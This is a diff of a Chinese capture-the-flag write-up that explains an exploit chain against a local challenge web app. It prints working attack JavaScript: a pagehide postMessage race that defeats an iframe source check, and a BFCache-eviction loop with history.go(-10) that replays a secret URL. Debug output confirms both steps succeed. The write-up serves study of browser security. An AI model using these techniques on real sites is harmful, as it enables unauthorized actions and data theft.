@@ -824,7 +824,7 @@ curl -si "http://localhost:3000/reports/check?rid=8d7b1188c0a93a59c69788b8&state
 # HTTP/1.1 403 Forbidden
 ```
 
-第二次访问里 `policy` 已经通过，`prepared` 也已就位，唯一卡住的是 `approved=false`。**这个字段由谁能置位、怎么置位，就是整条攻击链的主线**（服务端的置位条件见 3.2；攻击者怎么让它置位，从 2.8 的"批准问题"开始、2.9 给出完整路径）。
+第二次访问里 `policy` 已经通过，`prepared` 也已就位，唯一卡住的是 `approved=false`。**这个字段由谁能置位、怎么置位，就是整条攻击链的主线**（"置位"＝把字段的值从 false 改成 true；服务端的置位条件见 3.2；攻击者怎么让它置位，从 2.8 的"批准问题"开始、2.9 给出完整路径）。
 
 ### 2.7 附：`view` cookie 的发送与缓存机制
 
@@ -1020,27 +1020,67 @@ window.open("http://localhost:3000/review?u=" + 攻击脚本地址 + "&rid=" + r
 
 需要注意的是，这个弹窗只是攻击链的一环：它是注入问题的收尾（攻击脚本由此进入挑战域的沙箱）。主页面还有另一条并行的线（时机问题），2.10 讲。
 
-在进入"怎么让 `/complete` 被调用"之前，先交代服务端的置位条件：`/complete` 是批准接口，`id`、`prepared`、`admin`、`state` 四项全部满足才把 `approved` 置 true（完整讲解见 3.2）。这四项里，`prepared` 与 `admin` 由机器人自己满足（前面章节讲过）；`id` 在机器人打开 stage1 时被追加进 URL、页面脚本能读到，`state` 就在历史里那条首访审查页 URL 上（2.10 会用回退把它重新发出去）。所以留给攻击者的只剩一件事：**让审查界面在正确的时机真实地调用一次 `/complete`**。
+接下来要解决的是，成功调用 `/complete` 目标是将其中的 approved 改为 true。`/complete` 是批准接口，`id`、`prepared`、`admin`、`state` 四项全部满足才把 `approved` 置 true（完整讲解见 3.2）。这四项里，`prepared` 与 `admin` 由机器人自己满足（前面章节讲过）；`id` 在机器人打开 stage1 时被追加进 URL、页面脚本能读到，`state` 就在历史里那条首访审查页 URL 上（2.10 会用回退把它重新发出去）。所以留给攻击者的只剩一件事：**让审查界面在正确的时机真实地调用一次 `/complete`**。
 
 接下来是让审查界面调用一次 `/complete` 的环节。它的防线基于"消息来源 = 当前 iframe 窗口"的比较，而 iframe 被替换的瞬间恰好能打破这个比较。
 
 回到审查界面的消息处理逻辑（3.2 节源码）：
 
 ```js
-addEventListener("message", (e) => {
-  if (!closing || e.source === viewer.contentWindow) return;   // 校验条件
-  fetch("/complete", ...);                                     // 批准
-});
+// 加载攻击脚本 S2 的沙箱
+<iframe
+  id="viewer"
+  sandbox="allow-scripts"
+  src="/sandbox?rid=<%= encodeURIComponent(id) %>"></iframe>
+
+<script nonce="<%= nonce %>">
+  const viewer = document.getElementById("viewer");
+  const report = <%- JSON.stringify({ id, state }) %>;
+  let closing = false;
+
+  addEventListener("message", (e) => {
+    if (!closing || e.source === viewer.contentWindow) return;  // 校验条件
+
+    // 批准
+    fetch("/complete", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(report),
+    }).catch(() => {});
+  });
+
+  // 监听 iframe 内页面被加载的事件
+  viewer.addEventListener("load", () => {
+    if (closing) return;
+    closing = true;
+    viewer.src = <%- JSON.stringify(`/sandbox?rid=${encodeURIComponent(id)}&end`) %>;
+  });
+</script>
+
 ```
 
-两个条件必须同时成立：`closing === true`（iframe 第一次加载已完成）且 `e.source !== viewer.contentWindow`（消息来源不是当前 iframe 窗口）。
+下面这两个条件同时成立时会调用 `/complete` 接口：
+
+1. `closing === true`：iframe 第一次加载已完成。
+2. `e.source !== viewer.contentWindow`：消息来源不是当前 iframe 窗口。
+
+`/complete` 接口设置 approved 为 true，即批准。
+
 
 正常时序下，这两个条件没有同时成立的机会：
 
 - iframe 内的脚本刚运行就发消息（此时 load 还没完成）：`closing` 还是 false，被第一条拦掉；
-- iframe 加载完成（`closing` 变 true）之后：`viewer.src` 立刻被替换成空文档，脚本已被卸载，没有机会再发消息。
+- iframe 加载完成（`closing` 变 true）之后：`viewer.src` 立刻换成带 `&end` 的 `/sandbox` 地址；服务器对这个地址只返回一行 `<!doctype html>`（即"空文档"，源码见 3.2），文档被替换所以旧文档连同脚本随之被卸载。脚本此后只剩一次执行机会：卸载瞬间的 `pagehide`（下一段讲）；除它之外，它已没有别的时机能发消息。
 
-唯一的时间窗在**旧文档卸载的瞬间**。页面被导航替换时，浏览器会让旧文档在卸载前执行最后一次 JavaScript（`pagehide` 事件：页面即将被替换或关闭时触发的最后一个事件）。此时 `closing` 已经为 true，而消息的来源指向正在卸载的旧文档窗口；审查界面读取 `viewer.contentWindow` 时，拿到的已经是接管的新文档窗口。两者不相等，身份比较失效。
+
+在**iframe 内旧文档卸载的瞬间**会触发 S2 脚本内注册的 `pagehide` 事件的监听器，监听器代码回顾：
+```js
+addEventListener("pagehide", function(){ try { top.postMessage({p:1}, "*"); top.postMessage({p:2}, "*"); } catch(e){} });
+```
+发送的消息被**父页面**的`addEventListener("message" ...`监听器接收，监听器内的`e.source === viewer.contentWindow`此时会返回 false：两边都是**窗口引用**（比较的就是窗口对象），只是此刻一个（`viewer.contentWindow`）已指向新文档的窗口，另一个（`e.source`）是正在脱离的旧文档的窗口，两者不是同一个窗口。
+
+> `viewer.contentWindow` 是**框架的窗口代理（WindowProxy）**：对象身份全程不变、指向随导航切到新文档的窗口，窗口内文档未卸载的时候两者是同一个当前窗口；窗口内的文档卸载瞬间，`contentWindow` 已经切到新文档的窗口、`source` 还指向正在脱离的旧窗口（实测：此刻 `contentWindow` 读到的是新文档，`source` 的旧文档已不可访问），两者不再相等，身份比较失效。
+
 
 用两个实验对照验证（修改攻击脚本，其余流程不变）：
 
@@ -1052,7 +1092,7 @@ REVIEW-MSG source-is-viewer=true closing=false data={"p":1}
 
 两个条件全部不合格，`/complete` 从未被调用。后续步骤即使全部成功，第二次访问审查页也会因 `approved=false` 被 403 拦下。
 
-**对照二：pagehide 时机发消息**（正式攻击脚本的写法）：
+**对照二：改为通过 pagehide 时机发消息**（攻击脚本 S2 的真实写法）：
 
 ```js
 addEventListener("pagehide", function () {
@@ -1066,22 +1106,53 @@ REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
 [debug] /complete APPROVED SET!
 ```
 
-校验被绕过，`/complete` 两次调用都成功（脚本连发两条消息，互为冗余），`approved` 置位。
+校验被绕过，`/complete` 两次调用都成功（脚本连发两条消息；一条就够，双发是冗余保险），`approved` 置位。
 
 这里的 `top` 就是从沙箱 iframe 指向审查界面顶层窗口的引用。沙箱页是不透明源（`sandbox` 不给同源权限时，iframe 内容得到的"匿名"源，与任何站点都不同源），但这并不会阻止 `postMessage`（浏览器提供的跨源窗口通信接口）跨越（跨源消息本来就是它的用途）；消息数据也只有两个标记数字，不需要读取任何页面内容。
 
 ### 2.10 时机：挤出缓存与历史回退
 
-这一节对应 stage1 的第二段 JS（3.5 秒计时结束后的连续自导航）。批准的问题解决了，还缺渲染分支的另外三个条件：rid 匹配、`state` 匹配、`policy`。它们的答案是**同一个**：不要自己构造请求，而是**利用机器人浏览器历史里现成的那条审查页 URL**。
+这一节对应 stage1 的第二段 JS：机器人打开 stage1 后，主页面自己把"第二次访问"造出来。先看完整代码（2.5.2 里 attacker.js 的 `/stage1` 路由拼出的第二段 JS）：
 
-机器人主页面在打开 stage1 之前，访问过两个页面：审查页（首访，带 rid 和 state）和 `/api/flag`。也就是说，那条"带秘密参数的正确 URL"就存在于浏览器的历史记录里。让它重新被访问一次，三项条件自动全中：
+```js
+var ph = new URLSearchParams(location.search).get("ph");             // 当前处于哪个阶段（首次加载时为空）
+var nn = parseInt(new URLSearchParams(location.search).get("nn") || "0");   // 已连续导航的次数
+if (ph === "evict") {
+  // 驱逐循环：每 120ms 重新加载本页一次，直到 nn=8
+  if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }
+  // nn 到 8 之后：回退 10 步，回到历史栈底的那条审查页 URL
+  else { setTimeout(function(){ history.go(-10); }, 200); }
+} else {
+  // 首次加载走这里：3.5 秒后进入驱逐循环
+  setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=1"; }, 3500);
+}
+```
 
-- rid 和 state 是 URL 自带的；
-- 历史回退是浏览器自己发起的导航，请求头天然带 `Sec-Fetch-Site: none`（无来源）和 `Sec-Fetch-Dest: document`（整页），`policy` 自动通过。
+`history.go(-10);`是目标，它的最终目标是重新打开`/reports/check`。节 2.9 讲解了攻击页打开了挑战域的 `/review` 页面，在页面内加载我们的 S2 攻击脚本最终调用 `/complete` 接口解决了批准问题。
 
-但回退有一个必须处理的问题：**BFCache**（Back/Forward Cache，前进后退缓存）。浏览器会把最近访问过的页面整体缓存在内存里（包括页面结构 DOM（Document Object Model，文档对象模型）和 JavaScript 状态），按后退键时优先从缓存恢复。从缓存恢复不会向服务器发请求，服务器根本不知道"第二次访问"发生过。
+接下来要攻破的是 `/reports/check` 的渲染分支，它还缺另外三个条件：`rid` 匹配、`state (之前生成的nonce)` 匹配 以及通过 `policy` 函数。它们的答案是同一个：不要自己构造请求，而是利用机器人浏览器历史里现成的那条审查页 URL。机器人主页面在打开 stage1 之前，访问过两个页面：审查页`/reports/check`（首访，URL 自带 rid 和 state）和 `/api/flag`；通过历史回退让那条审查页 URL 被重新访问一次，三项条件自动全部通过：
 
-对照实验可以直接看出这个差异：
+- rid 和 state 是机器人打开 `/reports/check` 的时候自带的。
+- 历史回退是浏览器自己发起的导航，请求头天然带 `Sec-Fetch-Site: none`（无来源）和 `Sec-Fetch-Dest: document`（整页），`policy` 函数自动通过。
+
+`policy` 代码回顾：
+```js
+function policy(req) {
+  return Object.entries({
+    "sec-fetch-site": "none",
+    "sec-fetch-dest": "document",
+  })
+    .every(([header, expected]) => req.get(header) === expected);
+}
+```
+
+**首次加载（`else` 分支）：在 3.5 秒后进入驱逐循环**。这里的等待是为了等待节 2.9 里面讲的攻击完成（目标是通过调用 `/complete` 接口设置 approved 字段为 true），它大概在 2 秒内完成，留出余量此处设置 3.5 秒。
+
+> 注意：回退必须发生在批准之后，否则第二次访问会被 `approved=false` 拦掉。
+
+**驱逐循环（`if (nn < 8)`）：每 120ms 一次，连做 8 次，把首访审查页挤出 BFCache**。
+
+为什么要连开这么多新文档？因为 **BFCache**（Back/Forward Cache，前进后退缓存）：浏览器会把最近访问过的页面整体缓存在内存里（包括页面结构 DOM（Document Object Model，文档对象模型）和 JavaScript 状态），按后退键时优先从缓存恢复；从缓存恢复不会向服务器发请求，服务器根本不知道"第二次访问"发生过。而 Chrome/Chromium（同一内核）给每个标签页的 BFCache 条目数量**设有**上限（默认 6 条），连续加载足够多的新文档会把最早的条目（这里就是首访审查页）挤出缓存；被挤出的条目再回退时，只能重新向服务器请求。两个对照实验：
 
 **直接回退**（让机器人打开一个 4 秒后自动执行 `history.go(-10)` 的页面）：
 
@@ -1098,17 +1169,13 @@ REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
 [check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=true used=false
 ```
 
-对照实验中：直接回退命中了 BFCache（无请求，链路死掉）；先连开 8 个新文档再回退，才变成真实的网络请求。原因是 Chromium（Chrome 浏览器的开源内核）给每个标签页的 BFCache 条目数量设置有上限，**连续加载足够多的新文档会把最早的条目挤出缓存**，被挤出的条目再回退时只能重新向服务器请求。
+**回退（内层 `else`）：`history.go(-10)` 回到那条 URL**。回退动作发生时，主页面历史栈共 11 条（审查页首访、api/flag、stage1、8 个自导航变体）；从栈顶的第 11 条回退 10 步，正好落在栈底的审查页条目上。因为该条目已被挤出 BFCache，这次回退会变成一次真实的重新请求，2.11 的二访渲染就是它。
 
-stage1 里负责这件事的代码（即 2.5.2 里 attacker.js 的 `/stage1` 路由拼出的第二段 JS，此处单独看）：
+**两个实现细节**：
 
-```js
-// 每次导航间隔 120ms，连做 8 次，把历史堆到 11 条
-if (nn < 8) { setTimeout(function(){ location.href = location.pathname + "?ph=evict&nn=" + (nn+1); }, 120); }
-else { setTimeout(function(){ history.go(-10); }, 200); }   // 回退 10 步到栈底
-```
+① 间隔 120ms 是必需的：脚本连续跳转太快时，浏览器会把历史条目合并（后一跳替换上一跳），实测把间隔压到 0ms，8 跳后 `history.length` 只有 2、回退到不了首条；120ms 让每一跳都各自成为一条历史，整段约 1 秒，占 10 秒预算的一小段。
 
-为什么是 `go(-10)`：回退动作发生时，主页面历史栈共 11 条（审查页首访、api/flag、stage1、8 个自导航变体）。从栈顶的第 11 条回退 10 步，正好落在栈底的审查页条目上。
+② 每次重载都会把第一段 JS 也执行一遍（包括那句 `window.open`），但只有第一次有效。先看规则：`window.open(url, "REV")` 若找得到同名窗口（前提是需要与调用者在同一个"浏览上下文组"里才能找到），就复用它并把它导航到 url；找不到就当作新建、另开一个窗口。挑战页的响应头 `COOP: same-origin`（Cross-Origin-Opener-Policy，跨源打开者策略；来自 `helmet` 的默认配置，题目源码里看不到显式设置，见 2.3）则规定：**被跨源页面打开的窗口，在加载带这个头的页面之后，会移出打开者的"浏览上下文组"**（组内窗口才能互相引用、按名字互相找得到；跨组互相看不见）。于是：弹窗第一次打开后就被移出了本组，主页面后续的同名 open 找不到它、无法复用；按规则只能"新建"，另开一个新窗口；而 evict 重载的页面网址里没有 `rid`、`note` 参数，新窗口打开的地址是缺参数的（`rid=null&note=null`），服务器只会回 404。因此后续的 open 对攻击链没有作用。两组验证：① 一个最小页面的对照实验：主页面每次加载都执行 `window.open("…?from=N", "REV")`，唯一变量是弹窗页的响应带不带 `COOP: same-origin`。不带时，第二次 open 复用了原弹窗并把它导航到新地址（"复用"指复用窗口：不另开新的，只把新地址装进原来那个弹窗）；带上 `COOP: same-origin` 时，原弹窗留在原地，浏览器另开了一个新弹窗去加载目标地址。可见失效确由 COOP 引起。② 真实运行日志：整套"弹窗加载 → 沙箱 → S2 → 批准"的链路只跑了一套：题目服务器只记录到两次 `/sandbox` 请求（首次加载和 `&end`）、一次 `/complete`，攻击者服务器上 S2 只被拉取一次；此后原弹窗再无任何新请求。若后续 open 还碰得到它，必然会留下新的请求痕迹；没有痕迹，说明确实没碰到，链路完全不受影响。
 
 ### 2.11 渲染与外传
 
@@ -1516,6 +1583,7 @@ docker logs -f readonce-revenge-challenge-1
 | Fetch Metadata | 请求头 `Sec-Fetch-*` 系列，标明请求由谁发起；浏览器自动附加，脚本无法伪造 |
 | Opaque Origin（不透明源） | `sandbox` 属性不带 `allow-same-origin` 时，iframe 内容得到的"匿名"源，与任何站点都不同源 |
 | SameSite=Lax | cookie 属性：跨站请求不带 cookie，但顶层导航例外 |
+| 导航 | 让浏览器加载一个新文档的操作：给 `src`/`location` 赋新地址、点击链接、地址栏回车、历史前进/后退等 |
 | pagehide | 页面被导航替换/关闭前触发的事件，是页面最后一次执行 JavaScript 的机会 |
 | postMessage | 跨源窗口之间传递消息的 API，不要求同源 |
 | WindowProxy | 浏览器给窗口对象套的代理，页面脚本访问 `window`、`contentWindow` 时得到的都是它 |
